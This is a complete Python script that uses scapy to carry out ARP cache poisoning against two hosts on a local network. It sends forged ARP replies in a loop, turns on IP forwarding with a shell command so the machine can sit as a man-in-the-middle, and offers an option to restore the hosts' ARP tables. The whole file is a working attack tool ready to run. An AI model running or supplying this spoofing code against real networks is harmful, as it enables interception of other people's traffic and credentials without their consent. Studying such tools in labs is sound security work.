#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import subprocess
import sys

CURSOR_UP_ONE = "\x1b[1A"
ERASE_LINE = '\x1b[2K'


def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t1", "--target1", dest="targetIP1", help="Enter an IP Address to spoof.")
    parser.add_argument("-t2", "--target2", dest="targetIP2", help="Enter a second IP Address to spoof.")
    (options) = parser.parse_args()
    return options


def getMAC(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1)[0]
    return answered_list[0][1].hwsrc


def send_ARP_packet(targetIP, targetMAC, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(packet, verbose=False)


def enableIPforwarding():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def packetLoop(targetIP1, targetIP2):
    try:
        targetMAC1 = getMAC(targetIP1)
    except:
        print("[-] Please input a valid IP address for target 1 with the -t1 option.")
        sys.exit()

    try:
        targetMAC2 = getMAC(targetIP2)
    except:
        print("[-] Please input a valid IP address for target 2 with the -t2 option.")
        sys.exit()

    print("\n[+] Packets are being sent to:\n")
    print("1. " + targetIP1)
    print("2. " + targetIP2)
    print("\n Press CTRL + C to exit out of the program and stop sending packets to the targets.\n")

    while True:
        send_ARP_packet(targetIP1, targetMAC1, targetIP2)
        send_ARP_packet(targetIP2, targetMAC2, targetIP1)
        for x in range (1,4):
            b = "Packets are being sent" + "." * x
            print (b, end="\r")
            time.sleep(0.5)
        sys.stdout.write(ERASE_LINE)


def restore(targetIP1, targetIP2, targetMAC1, targetMAC2):
    packet1 = scapy.ARP(op=2, pdst=targetIP1, hwdst=targetMAC1, psrc=targetIP2, hwsrc=targetMAC2)
    packet2 = scapy.ARP(op=2, pdst=targetIP2, hwdst=targetMAC2, psrc=targetIP1, hwsrc=targetMAC1)
    scapy.send(packet1, count=4, verbose=False)
    scapy.send(packet2, count=4, verbose=False)


def main():
    options = getArguments()
    targetIP1 = options.targetIP1
    targetIP2 = options.targetIP2

    booleanInput1 = input("Do you want to spoof two machines or restore their ARP tables back to normal? Input spoof or restore: ")
    if booleanInput1 == "s" or booleanInput1 == "spoof":
        booleanInput2 = input("Have you enabled IP forwarding? Input yes or no: ")
        if booleanInput2 == "y" or booleanInput2 == "yes":
            packetLoop(targetIP1, targetIP2)
        elif booleanInput2 == "n" or booleanInput2 == "no":
            enableIPforwarding()
            print("[+] We have enabled IP forwarding for you.\n")
            print("[+] The code will run in 5 seconds.")
            time.sleep(5)
            packetLoop(targetIP1, targetIP2)
        else:
            print("Please provide a valid input.")
    if booleanInput1 == "r" or booleanInput1 == "restore":
        print("\n[+] The program will now restore the ARP table of " + targetIP1 + " and " + targetIP2 + ".\n")

        try:
            targetMAC1 = getMAC(targetIP1)
        except:
            print("[-] Please input a valid IP address for target 1 with the -t1 option.")
            sys.exit()

        try:
            targetMAC2 = getMAC(targetIP2)
        except:
            print("[-] Please input a valid IP address for target 2 with the -t2 option.")
            sys.exit()

        print("[+] The spoof will be undone and the MAC address of " + targetIP1 + " in the ARP table of " + targetIP2 + " will be reset to " + targetMAC1)
        print("[+] The MAC address of " + targetIP2 + " in the ARP table of " + targetIP1 + " will be reset to " + targetMAC2)
        booleanInput3 = input("\nDo you wish to continue? Input yes or no: ")
        if booleanInput3 == "y" or booleanInput3 == "yes":
            restore(targetIP1, targetIP2, targetMAC1, targetMAC2)
            print("\n[+] The ARP tables of the two targets have been successfully restored.\n")
            time.sleep(1)
            print("\n-----------------Quitting-----------------\n")
            time.sleep(1)
            sys.exit()
        elif booleanInput3 == "n" or booleanInput3 == "no":
            print("\nRerun the program to spoof or restore the two targets.")
            print("\n-----------------Quitting-----------------\n")
            time.sleep(1)
            sys.exit()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n-----------------Quitting-----------------\n")
        time.sleep(1)
        sys.exit()
